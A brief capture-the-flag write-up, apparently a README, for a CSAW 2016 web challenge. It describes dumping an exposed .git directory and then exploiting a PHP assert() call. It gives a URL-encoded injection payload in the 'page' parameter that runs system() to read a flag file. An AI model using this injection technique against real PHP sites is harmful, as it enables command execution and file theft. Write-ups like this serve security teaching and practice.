# CSAW2016-ctf
I found: http://web.chal.csaw.io:8000/.git/ <br>
And used https://github.com/kost/dvcs-ripper tô get all find. <br>
Then i found the assert() function. <br>
payload: view-source:http://web.chal.csaw.io:8000/?page=%27)%20||%20system(%22cat%20templates/flag.php%22);// <br>

Reference: http://stackoverflow.com/questions/3115559/exploitable-php-functions
